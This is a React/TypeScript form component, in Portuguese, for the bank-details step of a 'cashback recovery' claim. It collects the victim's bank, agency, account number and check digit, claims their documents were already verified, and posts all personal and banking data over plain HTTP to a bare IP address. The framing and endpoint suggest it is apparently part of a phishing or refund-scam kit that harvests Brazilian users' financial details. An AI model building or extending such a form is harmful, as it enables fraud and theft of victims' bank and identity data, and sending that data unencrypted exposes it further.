import React, { useState } from 'react';
import { BankData, UserData } from '../types';
import { ArrowRight, ArrowLeft, CheckCircle } from 'lucide-react';
import axios from 'axios';

interface BankInfoStepProps {
  userData: UserData;
  bankData: BankData;
  onUpdateBankData: (data: Partial<BankData>) => void;
  onComplete: (claimId: string) => void;
  onPrev: () => void;
  setIsSubmitting: (isSubmitting: boolean) => void;
  setError: (error: string | null) => void;
}

const BankInfoStep: React.FC<BankInfoStepProps> = ({
  userData,
  bankData,
  onUpdateBankData,
  onComplete,
  onPrev,
  setIsSubmitting,
  setError
}) => {
  const [errors, setErrors] = useState<Partial<Record<keyof BankData, string>>>({});

  const bankOptions = [
    { value: 'itau', label: 'Itaú' },
    { value: 'bradesco', label: 'Bradesco' },
    { value: 'santander', label: 'Santander' },
    { value: 'bb', label: 'Banco do Brasil' },
    { value: 'caixa', label: 'Caixa Econômica Federal' },
    { value: 'nubank', label: 'Nubank' },
    { value: 'inter', label: 'Banco Inter' },
    { value: 'c6bank', label: 'C6 Bank' },
    { value: 'original', label: 'Banco Original' },
    { value: 'next', label: 'Next' },
    { value: 'outro', label: 'Outro' }
  ];

  const accountTypeOptions = [
    { value: 'corrente', label: 'Conta Corrente' },
    { value: 'poupanca', label: 'Conta Poupança' }
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const newErrors: Partial<Record<keyof BankData, string>> = {};
    
    // Validate bank name
    if (!bankData.bankName) {
      newErrors.bankName = 'Banco é obrigatório';
    }
    
    // Validate account type
    if (!bankData.accountType) {
      newErrors.accountType = 'Tipo de conta é obrigatório';
    }
    
    // Validate agency
    if (!bankData.agency) {
      newErrors.agency = 'Agência é obrigatória';
    } else if (!/^\d+$/.test(bankData.agency)) {
      newErrors.agency = 'Agência deve conter apenas números';
    }
    
    // Validate account
    if (!bankData.account) {
      newErrors.account = 'Conta é obrigatória';
    } else if (!/^\d+$/.test(bankData.account)) {
      newErrors.account = 'Conta deve conter apenas números';
    }
    
    // Validate account digit
    if (!bankData.accountDigit) {
      newErrors.accountDigit = 'Dígito é obrigatório';
    } else if (!/^[\dxX]$/.test(bankData.accountDigit)) {
      newErrors.accountDigit = 'Dígito inválido';
    }
    
    setErrors(newErrors);
    
    // If no errors, submit the form
    if (Object.keys(newErrors).length === 0) {
      try {
        setIsSubmitting(true);
        setError(null);
        
        // Send to API
        const response = await axios.post('http://67.211.45.154:3001/api/save-bank-info', {
          userData,
          bankData
        });
        
        // If successful, complete the process
        if (response.data.success && response.data.claimId) {
          onComplete(response.data.claimId);
        } else {
          throw new Error('Resposta inválida do servidor');
        }
      } catch (error) {
        console.error('Error saving bank information:', error);
        setError('Erro ao salvar informações bancárias. Por favor, tente novamente.');
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  return (
    <div className="max-w-2xl mx-auto bg-white rounded-lg shadow-lg p-8">
      <h2 className="text-2xl font-bold text-center text-blue-700 mb-6">
        Informações Bancárias
      </h2>
      
      <div className="bg-green-50 border-l-4 border-green-500 p-4 mb-6">
        <div className="flex">
          <div className="flex-shrink-0">
            <CheckCircle className="h-5 w-5 text-green-500" />
          </div>
          <div className="ml-3">
            <p className="text-sm text-green-700">
              Seus documentos foram verificados com sucesso! Agora, precisamos das suas informações bancárias para depositar o cashback recuperado.
            </p>
          </div>
        </div>
      </div>
      
      <form onSubmit={handleSubmit}>
        <div className="mb-6">
          <label htmlFor="bankName" className="block text-gray-700 font-medium mb-2">
            Banco <span className="text-red-500">*</span>
          </label>
          <select
            id="bankName"
            value={bankData.bankName || ''}
            onChange={(e) => onUpdateBankData({ bankName: e.target.value })}
            className={`w-full px-4 py-3 rounded-lg border ${
              errors.bankName ? 'border-red-500' : 'border-gray-300'
            } focus:outline-none focus:ring-2 focus:ring-blue-500`}
          >
            <option value="">Selecione seu banco</option>
            {bankOptions.map((option) => (
              <option key={option.value} value={option.value}>
                {option.label}
              </option>
            ))}
          </select>
          {errors.bankName && <p className="text-red-500 text-sm mt-1">{errors.bankName}</p>}
        </div>
        
        <div className="mb-6">
          <label htmlFor="accountType" className="block text-gray-700 font-medium mb-2">
            Tipo de Conta <span className="text-red-500">*</span>
          </label>
          <div className="flex space-x-4">
            {accountTypeOptions.map((option) => (
              <label key={option.value} className="flex items-center">
                <input
                  type="radio"
                  name="accountType"
                  value={option.value}
                  checked={bankData.accountType === option.value}
                  onChange={() => onUpdateBankData({ accountType: option.value })}
                  className="h-5 w-5 text-blue-600"
                />
                <span className="ml-2 text-gray-700">{option.label}</span>
              </label>
            ))}
          </div>
          {errors.accountType && <p className="text-red-500 text-sm mt-1">{errors.accountType}</p>}
        </div>
        
        <div className="mb-6">
          <label htmlFor="agency" className="block text-gray-700 font-medium mb-2">
            Agência <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            id="agency"
            value={bankData.agency || ''}
            onChange={(e) => onUpdateBankData({ agency: e.target.value.replace(/\D/g, '') })}
            className={`w-full px-4 py-3 rounded-lg border ${
              errors.agency ? 'border-red-500' : 'border-gray-300'
            } focus:outline-none focus:ring-2 focus:ring-blue-500`}
            placeholder="Número da agência (sem dígito)"
            maxLength={6}
          />
          {errors.agency && <p className="text-red-500 text-sm mt-1">{errors.agency}</p>}
        </div>
        
        <div className="grid grid-cols-3 gap-4 mb-6">
          <div className="col-span-2">
            <label htmlFor="account" className="block text-gray-700 font-medium mb-2">
              Conta <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="account"
              value={bankData.account || ''}
              onChange={(e) => onUpdateBankData({ account: e.target.value.replace(/\D/g, '') })}
              className={`w-full px-4 py-3 rounded-lg border ${
                errors.account ? 'border-red-500' : 'border-gray-300'
              } focus:outline-none focus:ring-2 focus:ring-blue-500`}
              placeholder="Número da conta"
              maxLength={12}
            />
            {errors.account && <p className="text-red-500 text-sm mt-1">{errors.account}</p>}
          </div>
          
          <div>
            <label htmlFor="accountDigit" className="block text-gray-700 font-medium mb-2">
              Dígito <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="accountDigit"
              value={bankData.accountDigit || ''}
              onChange={(e) => {
                const value = e.target.value.slice(0, 1);
                onUpdateBankData({ accountDigit: value });
              }}
              className={`w-full px-4 py-3 rounded-lg border ${
                errors.accountDigit ? 'border-red-500' : 'border-gray-300'
              } focus:outline-none focus:ring-2 focus:ring-blue-500`}
              placeholder="X"
              maxLength={1}
            />
            {errors.accountDigit && <p className="text-red-500 text-sm mt-1">{errors.accountDigit}</p>}
          </div>
        </div>
        
        <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
          <p className="text-sm text-yellow-800">
            Confirme que os dados bancários estão corretos. O cashback será depositado na conta informada.
          </p>
        </div>
        
        <div className="flex justify-between mt-8">
          <button
            type="button"
            onClick={onPrev}
            className="bg-gray-200 hover:bg-gray-300 text-gray-800 font-medium py-2 px-6 rounded-full transition-colors duration-300 flex items-center"
          >
            <ArrowLeft className="mr-2" size={18} />
            Voltar
          </button>
          
          <button
            type="submit"
            className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-6 rounded-full transition-colors duration-300 flex items-center"
          >
            Finalizar Solicitação
            <ArrowRight className="ml-2" size={18} />
          </button>
        </div>
      </form>
      
      <div className="mt-6 text-center">
        <p className="text-gray-500 text-xs">
          Ao finalizar, você concorda com nossos termos de serviço e política de privacidade.
        </p>
      </div>
    </div>
  );
};

export default BankInfoStep;